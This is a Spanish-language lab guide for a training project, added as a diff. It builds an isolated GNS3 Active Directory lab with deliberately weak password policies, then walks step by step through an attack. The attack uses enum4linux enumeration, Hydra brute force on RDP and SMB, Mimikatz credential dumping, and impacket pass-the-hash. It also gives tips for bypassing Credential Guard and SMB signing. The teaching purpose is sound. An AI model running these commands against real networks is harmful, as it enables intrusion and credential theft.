@@ -1,0 +1,338 @@
+CASO 4: POLÍTICAS DE CONTRASEÑAS DÉBILES
+"Contraseñas Fáciles Ltda."
+1. DESCRIPCIÓN GENERAL
+Esta empresa ficticia, "Contraseñas Fáciles Ltda.", representa un escenario muy común en organizaciones que no implementan políticas de contraseñas robustas. Los empleados utilizan contraseñas fáciles de adivinar ("admin123", "empresa2024", "password"), las reutilizan en múltiples servicios y no existen mecanismos de bloqueo tras intentos fallidos. Además, las cuentas de servicio suelen tener contraseñas almacenadas en archivos de texto plano. Este caso demuestra cómo un atacante interno (o externo que haya ganado acceso inicial) puede escalar privilegios y moverse lateralmente mediante la explotación de credenciales débiles.
+
+2. OBJETIVO DEL CASO
+Demostrar que:
+
+Las contraseñas débiles son un eslabón crítico en la cadena de seguridad.
+
+Un atacante con acceso a la red interna puede realizar ataques de fuerza bruta y obtener credenciales en poco tiempo.
+
+La reutilización de contraseñas permite el movimiento lateral (acceder a múltiples sistemas con la misma credencial).
+
+La ausencia de bloqueo de cuentas facilita los ataques de diccionario.
+
+Herramientas como Hydra (fuerza bruta) y Mimikatz (extracción de credenciales en memoria) son letales en entornos con malas prácticas.
+
+3. CONFIGURACIÓN DETALLADA DEL ESCENARIO EN GNS3
+Vamos a simular una pequeña oficina con un dominio Windows (o grupo de trabajo con servidor y clientes) y políticas de contraseñas inexistentes. El atacante estará en la misma red interna (podría ser un empleado descontento o un atacante que ya logró acceso a un equipo).
+
+Topología:
+text
+[Kali Linux] --- (Switch) --- [Controlador de Dominio (Windows Server)]
+                        |
+                        +--- [Cliente Windows 10 (usuario1)]
+                        |
+                        +--- [Cliente Windows 10 (usuario2)]
+                        |
+                        +--- [Servidor de Archivos (Windows Server o Linux Samba)]
+Todos en la misma subred (por ejemplo, 192.168.1.0/24). El atacante (Kali) está conectado al mismo switch.
+
+Máquinas necesarias:
+Máquina	Sistema	Rol	IP (estática recomendada)	Características
+Atacante	Kali Linux	Red Team	192.168.1.100	Herramientas: nmap, hydra, enum4linux, impacket, metasploit (con mimikatz)
+Controlador de dominio	Windows Server 2019	Active Directory Domain Controller	192.168.1.10	Configurar dominio "facil.local". Política de contraseñas: sin requisitos de complejidad, longitud mínima 4 caracteres, sin bloqueo de cuentas.
+Cliente 1	Windows 10	Usuario del dominio (ej: "jperez")	192.168.1.20	Unido al dominio. El usuario tiene contraseña débil (ej: "clave123").
+Cliente 2	Windows 10	Usuario del dominio (ej: "mgomez")	192.168.1.21	Unido al dominio. Contraseña débil (ej: "empresa2024").
+Servidor de archivos	Windows Server o Linux con Samba	Recurso compartido	192.168.1.30	Compartir carpeta con documentos. Accesible con credenciales de dominio.
+Detalles de cada máquina:
+a) Controlador de dominio (Windows Server):
+
+Instalar Windows Server con rol de Active Directory Domain Services.
+
+Promover a controlador de dominio en un nuevo bosque: dominio = facil.local.
+
+Configurar política de contraseñas (en Group Policy Management):
+
+Navegar a Default Domain Policy → Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Password Policy.
+
+Establecer:
+
+Enforce password history: 0
+
+Maximum password age: 0 (no expira)
+
+Minimum password length: 4 (o incluso permitir vacías, pero mejor poner 4 para que sea débil)
+
+Password must meet complexity requirements: Disabled
+
+Store passwords using reversible encryption: Enabled (para facilitar ataques, aunque no es necesario)
+
+En Account Lockout Policy:
+
+Account lockout duration: 0 (no bloquear)
+
+Account lockout threshold: 0 (no bloquear tras intentos)
+
+Reset account lockout counter after: 0
+
+Crear usuarios de dominio:
+
+jperez con contraseña clave123 (no marcar "cambiar contraseña en próximo inicio")
+
+mgomez con contraseña empresa2024
+
+adminlocal con contraseña admin (cuenta de administrador con nombre predecible, aunque no la usaremos directamente)
+
+Habilitar servicios: RDP, SMB (compartir archivos), DNS, etc.
+
+Desactivar firewall o abrir puertos necesarios (para simplificar).
+
+b) Clientes Windows 10:
+
+Unir al dominio facil.local.
+
+Durante la unión, usar credenciales de administrador del dominio (ej: administrator con contraseña que hayas puesto, puede ser Admin123).
+
+Crear perfiles de usuario localmente (o dejar que al iniciar sesión con los usuarios de dominio se creen automáticamente).
+
+Iniciar sesión con jperez y mgomez para generar perfiles y hashes en memoria.
+
+Dejar el firewall de Windows desactivado o con reglas permisivas.
+
+c) Servidor de archivos (Windows Server o Linux Samba):
+
+Si usas Windows Server, instalarlo como servidor miembro del dominio (no controlador). Crear un recurso compartido (ej: \\fileserver\documentos) con permisos de lectura/escritura para los usuarios del dominio.
+
+Si usas Linux con Samba, unirlo al dominio (realm join) y configurar un recurso compartido. Para simplificar, podemos usar Windows Server.
+
+d) Kali Linux (atacante):
+
+Configurar IP estática en la misma red.
+
+Asegurar que tiene herramientas: hydra, nmap, enum4linux, smbclient, impacket-scripts, metasploit-framework.
+
+Instalar mimikatz en Metasploit o tener el ejecutable de mimikatz para Windows (luego se sube al cliente comprometido).
+
+4. PASOS PARA MONTAR EL ESCENARIO EN GNS3
+Paso 1: Crear el proyecto en GNS3.
+
+Nuevo proyecto: "Caso4_ContraseñasDebiles".
+
+Paso 2: Importar las máquinas virtuales a GNS3 desde VirtualBox.
+
+Asegurar que todas tienen una interfaz de red en modo "Red Interna" (mismo nombre, ej: "intnet4") para que estén aisladas de la red física.
+
+Importar: Kali, Windows Server (DC), Windows 10 (dos), Windows Server (file server) o Linux.
+
+Paso 3: Arrastrar dispositivos al área de trabajo.
+
+Un switch Ethernet de GNS3.
+
+Las 5 máquinas (Kali, DC, cliente1, cliente2, file server).
+
+Conectar todas al switch.
+
+Paso 4: Configurar las IPs estáticas.
+
+Asignar direcciones según tabla. En Windows, desde Panel de control o PowerShell. En Kali, editar /etc/network/interfaces o usar nmcli.
+
+Verificar conectividad: desde Kali, hacer ping a todas las IPs.
+
+Paso 5: Configurar el dominio y usuarios.
+
+Encender el DC y configurar Active Directory como se indicó.
+
+Unir los clientes y el file server al dominio (requiere que el DC esté encendido y accesible). En los clientes, configurar DNS apuntando al DC (192.168.1.10) para que resuelvan facil.local.
+
+Crear los usuarios en el DC.
+
+En los clientes, iniciar sesión con los usuarios para que se creen los perfiles.
+
+Paso 6: Verificar servicios.
+
+Desde Kali, probar accesibilidad a los servicios:
+
+nmap -sV 192.168.1.10-30 para ver puertos abiertos (debería ver 445, 3389, etc.).
+
+enum4linux -a 192.168.1.10 para enumerar usuarios del dominio (debe listar jperez, mgomez, etc.).
+
+smbclient -L //192.168.1.30 -N para ver recursos compartidos anónimos (quizá no permita sin credenciales, pero podemos probar con usuario nulo).
+
+5. ATAQUE PASO A PASO (DESDE KALI)
+Fase 1: Reconocimiento y enumeración de usuarios
+
+Primero, identificamos el controlador de dominio y enumeramos usuarios válidos:
+
+bash
+nmap -sS -p 445,139 192.168.1.0/24
+Luego, usamos enum4linux para extraer lista de usuarios del dominio:
+
+bash
+enum4linux -U 192.168.1.10
+Esto debería devolver los nombres de usuario: jperez, mgomez, administrator, krbtgt, etc. Guardamos los que nos interesan (jperez, mgomez) en un archivo usuarios.txt.
+
+Evidencia: Captura de salida de enum4linux.
+
+Fase 2: Ataque de fuerza bruta a RDP o SMB
+
+Podemos atacar el servicio RDP (puerto 3389) o SMB (puerto 445) con Hydra, usando un diccionario de contraseñas comunes.
+
+Por ejemplo, atacando RDP en el cliente1 (192.168.1.20):
+
+bash
+hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.20
+O si rockyou.txt es muy grande, podemos usar un diccionario pequeño de contraseñas comunes (crear un archivo passwords.txt con: clave123, empresa2024, admin123, password, 123456, etc.).
+
+También podemos atacar SMB:
+
+bash
+hydra -L usuarios.txt -P passwords.txt smb://192.168.1.20
+Resultado esperado: Hydra encontrará rápidamente que jperez:clave123 funciona en el cliente1, y mgomez:empresa2024 en el cliente2 (o en el DC si esos usuarios tienen permiso de RDP).
+
+Evidencia: Captura de pantalla de Hydra mostrando credenciales encontradas.
+
+Fase 3: Acceso inicial a un cliente comprometido
+
+Con las credenciales de jperez, podemos conectarnos por RDP al cliente1:
+
+bash
+xfreerdp /v:192.168.1.20 /u:jperez /p:clave123 /dynamic-resolution
+O usar rdesktop. Esto nos dará una sesión gráfica en la máquina del usuario. Si no tenemos interfaz gráfica en Kali, podemos usar winexe para ejecutar comandos remotos:
+
+bash
+winexe -U jperez%clave123 //192.168.1.20 "cmd.exe"
+Evidencia: Captura de la sesión RDP o de la consola remota.
+
+Fase 4: Extracción de credenciales con Mimikatz
+
+Una vez dentro del cliente (o con acceso de comandos), podemos descargar y ejecutar Mimikatz para extraer hashes de contraseñas de la memoria (LSASS). Necesitamos privilegios de administrador local en el cliente. Si el usuario jperez no es administrador, podemos intentar escalar privilegios localmente (quizá otro caso), pero para este escenario, podemos asumir que los usuarios tienen privilegios de administrador en sus equipos (mala práctica común) o podemos haber comprometido una cuenta con privilegios.
+
+Pasos:
+
+Subir Mimikatz al cliente (desde Kali, con smbclient o compartiendo una carpeta).
+
+Ejecutar Mimikatz:
+
+cmd
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+Esto mostrará contraseñas en texto plano y hashes de los usuarios que han iniciado sesión (incluyendo posiblemente la del propio usuario y quizá del dominio si hay sesiones abiertas).
+
+Evidencia: Captura de la salida de Mimikatz mostrando hashes.
+
+Fase 5: Movimiento lateral con Pass-the-Hash
+
+Con los hashes obtenidos, podemos intentar conectarnos a otros sistemas (ej: el servidor de archivos o el DC) usando la técnica pass-the-hash con herramientas como psexec de Impacket:
+
+bash
+impacket-psexec -hashes LMHASH:NTHASH administrador@192.168.1.30
+O si obtenemos el hash de un usuario con privilegios (ej: administrator), podemos acceder directamente al DC.
+
+Evidencia: Captura de la conexión exitosa a otro sistema.
+
+Fase 6: Acceso al recurso compartido
+
+Si no logramos pass-the-hash, al menos podemos acceder al servidor de archivos con las credenciales obtenidas (jperez) y listar/descargar documentos sensibles:
+
+bash
+smbclient //192.168.1.30/documentos -U jperez%clave123
+Evidencia: Captura de smbclient mostrando archivos.
+
+6. EVIDENCIAS A CAPTURAR (PARA DOCUMENTACIÓN)
+Salida de enum4linux con lista de usuarios.
+
+Captura de pantalla de Hydra encontrando credenciales.
+
+Captura de la sesión RDP o acceso remoto al cliente.
+
+Captura de la ejecución de Mimikatz mostrando hashes/contraseñas.
+
+Captura de conexión a otro sistema (servidor de archivos o DC) mediante pass-the-hash o con credenciales.
+
+Opcional: Captura de Wireshark mostrando tráfico SMB o RDP.
+
+7. LECCIONES APRENDIDAS (PARA EL INFORME)
+Las contraseñas débiles son fácilmente adivinables mediante ataques de diccionario o fuerza bruta.
+
+La falta de bloqueo de cuentas permite realizar miles de intentos sin ser detectado.
+
+La reutilización de contraseñas permite el movimiento lateral (una vez comprometida una cuenta, se puede acceder a otros sistemas).
+
+Las credenciales almacenadas en memoria (Mimikatz) son un riesgo grave si un atacante obtiene privilegios locales.
+
+La implementación de políticas de contraseñas robustas (complejidad, longitud mínima, expiración) y autenticación multifactor (MFA) es esencial.
+
+Es importante limitar los privilegios de los usuarios (no dar admin local) y utilizar herramientas de monitoreo para detectar fuerza bruta.
+
+8. RELACIÓN CON EL PROYECTO YAS
+Este caso justifica la necesidad de entrenar a los alumnos en:
+
+Concienciación sobre la creación de contraseñas seguras.
+
+Implementación de políticas de seguridad en Active Directory.
+
+Detección de ataques de fuerza bruta (mediante análisis de logs).
+
+Uso de herramientas como Mimikatz para entender cómo los atacantes extraen credenciales.
+
+Prácticas de hardening en estaciones de trabajo y servidores (LAPS para administradores locales, restricción de privilegios).
+
+YAS proporcionará un entorno controlado para practicar tanto los ataques como las defensas correspondientes.
+
+9. RECURSOS NECESARIOS Y POSIBLES PROBLEMAS
+Recursos necesarios:
+Imágenes de máquinas virtuales:
+
+Kali Linux (para atacante)
+
+Windows Server 2019 (para DC y file server)
+
+Windows 10 (dos clientes)
+
+Software adicional:
+
+GNS3 con integración VirtualBox
+
+En Kali: hydra, enum4linux, impacket, winexe, xfreerdp, mimikatz (precargado o descargable)
+
+Diccionarios de contraseñas:
+
+Puedes usar rockyou.txt (viene en Kali en /usr/share/wordlists/rockyou.txt, descomprimirlo)
+
+O crear uno personalizado con contraseñas comunes.
+
+Posibles problemas y soluciones:
+La unión al dominio falla:
+
+Verificar que los clientes tengan DNS apuntando al DC.
+
+Comprobar que el DC esté encendido y accesible.
+
+En Windows, usar ping facildc.facil.local para ver resolución.
+
+Desactivar firewalls temporalmente.
+
+Hydra no encuentra contraseñas:
+
+Asegurar que el servicio atacado (RDP, SMB) esté accesible desde Kali: probar con nc -nv 192.168.1.20 3389 para ver si responde.
+
+Verificar que las contraseñas en el diccionario coincidan con las configuradas.
+
+Si el servicio RDP requiere autenticación de nivel de red (NLA), hydra puede no funcionar bien; probar con SMB.
+
+Mimikatz no funciona (error privilege::debug):
+
+Necesitas ejecutar Mimikatz con privilegios de administrador. Si el usuario no es admin, intentar escalar privilegios (fuera del alcance de este caso, pero se puede mencionar).
+
+En Windows 10 con Protección contra alteraciones (tamper protection) o Credential Guard, Mimikatz puede estar bloqueado. Para este caso educativo, podemos desactivar esas protecciones o usar una versión anterior de Windows (Windows 7/8.1).
+
+Problemas de rendimiento en GNS3:
+
+Windows 10 y Windows Server son pesados. Asignar al menos 2 GB de RAM a cada uno, y 1 GB a Kali. Si el equipo no soporta tantas VMs, reducir el número: por ejemplo, usar solo un cliente y el DC, y atacar directamente el DC (si tiene RDP habilitado para administradores). O usar Linux con Samba en lugar de Windows Server para file server.
+
+Pass-the-hash no funciona:
+
+Asegurar que el servicio SMB esté habilitado en el destino.
+
+Usar la sintaxis correcta de Impacket: impacket-psexec -hashes :NTHASH usuario@ip.
+
+Si el destino es Windows 10 reciente, puede requerir SMB signing, etc. En un entorno de laboratorio, podemos desactivar esas restricciones.
+
+Winexe no conecta:
+
+Puede necesitar credenciales de administrador y que el firewall permita puertos administrativos (445, 139). Probar con psexec de Impacket en su lugar.
+
